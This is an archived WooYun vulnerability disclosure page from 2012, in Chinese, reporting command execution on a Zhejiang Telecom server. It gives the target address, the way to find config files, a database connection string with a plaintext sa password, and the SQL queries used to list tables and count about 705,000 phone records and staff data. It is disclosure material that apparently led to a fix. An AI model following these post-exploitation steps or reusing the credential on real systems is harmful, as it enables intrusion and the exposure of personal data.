@@ -1,0 +1,272 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		浙江电信命令执行 导致大量员工与电话号码信息泄露  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		浙江电信命令执行 导致大量员工与电话号码信息泄露  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/NiceWorm">NiceWorm</a> 
+</li><li>提交时间：		2012-09-21 13:19</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-09-21：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-09-26：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-10-06：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-10-16：	细节向普通白帽子公开<br/>
+									2012-10-26：	细节向实习白帽子公开<br/>
+									2012-11-05：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">由于上次没找数据就直接提交了，被告诉无危害。。所以就认真弄一下</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">http://122.224.72.91/user/login.action<br />
+<br />
+命令执行地址。<br />
+<br />
+这里详细说说快速定位配置文件的方法吧，<br />
+<br />
+大牛可以飘过，小菜我一般是找xml和properties的文件。<br />
+<br />
+具体地方在WEB-INF和其子目录classes下面。如果嫌麻烦可以输命令<br />
+<br />
+先找到网站的地址。<br />
+<br />
+这里地址是/usr/java/project/mms20100205/WebRoot<br />
+<br />
+然后<br />
+<br />
+linux 用命令 find /usr/java/project/mms20100205/WebRoot -name *.properties<br />
+<br />
+找到文件/usr/java/project/mms20100205/WebRoot/WEB-INF/classes/system_paramter.properties<br />
+<br />
+<br />
+<br />
+确认其数据库连接字符串。然后就可以连接数据库了<br />
+<br />
+driverClassName=net.sourceforge.jtds.jdbc.Driver<br />
+<br />
+url=jdbc:jtds:sqlserver://115.***.***.29:1493/dxmms<br />
+<br />
+username=sa<br />
+<br />
+password=zxcvbnm<br />
+<br />
+<br />
+<br />
+连接上以后。不知道数据库名字先查询数据库名字<br />
+<br />
+</p><pre><code>select * from master..sysdatabases D where sid not in(select sid from<br />
+master..syslogins where name=&#039;sa&#039;)</code></pre><p class='detail'><br />
+<br />
+找到</p><pre><code>weibo</code></pre><p class='detail'><br />
+<br />
+然后查询表名<br />
+<br />
+</p><pre><code>use weibo<br />
+select Name from sysobjects where xtype=&#039;u&#039; and status&gt;=0</code></pre><p class='detail'><br />
+<br />
+得到<br />
+<br />
+</p><pre><code>Name<br />
+sysname<br />
+yuangongweibo20120104<br />
+yuangongweibo20120103<br />
+txt<br />
+yuangongweibo20120101<br />
+yuangongweibo20120105<br />
+yuangongweibo20120106<br />
+yuangongweibo20120107<br />
+yuangongweibo20120108<br />
+yuangongweibo20120109<br />
+yuangongweibo20120110<br />
+yuangongweibo20120111<br />
+yuangongweibo20120112<br />
+yuangongweibo20120113<br />
+res<br />
+res_log<br />
+getres_logs<br />
+lt_weib_user<br />
+lt_weib_user_1031<br />
+Sheet1$<br />
+lt_weibo_user<br />
+sin_lt_weiboflow<br />
+lt_weibo_user_cnt<br />
+weibo_token<br />
+sina_weibo_task_log<br />
+temp_new_ltweibo<br />
+yizhoutianqi<br />
+subscrib<br />
+lt_temp<br />
+a3<br />
+a4<br />
+a5<br />
+a6<br />
+a10<br />
+a<br />
+a11<br />
+test</code></pre><p class='detail'><br />
+<br />
+然后就看那些表我们有兴趣。先获得以下数据的条数吧<br />
+<br />
+</p><pre><code>use weibo<br />
+select count(*) from txt<br />
+<br />
+11125</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>use weibo<br />
+select count(*) from lt_weib_user_1031<br />
+10544</code></pre><p class='detail'><br />
+<br />
+</p><pre><code>use weibo<br />
+select count(*) from res<br />
+705598</code></pre><p class='detail'><br />
+<br />
+发现这个2个比较多。res应该就是所有浙江省的电话号码吧。。里面全是电话。<br />
+<br />
+lt_weib_user_1031这个表应该是所有员工的信息了。。<br />
+<br />
+看了以下前几条。。绝对没乱来。。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/21131226c64abbb15200870fd46b59c774db8367.png" target="_blank"><img src="../images/21131226c64abbb15200870fd46b59c774db8367.png" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">升级。。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/NiceWorm" title="NiceWorm">NiceWorm</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-012512" title="浙江电信命令执行 导致大量员工与电话号码信息泄露">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：8 </p>
+													<p class="detail">确认时间：2012-09-26 03:26</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">CNVD确认漏洞情况，转由CNCERT统一协调中国电信集团公司批量处置。<br />
+<br />
+按通用软件漏洞进行评分，rank 8</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+																	<p class="detail">2012-09-27：至27日，漏洞已经不存在。</p>
+											
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="12512";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
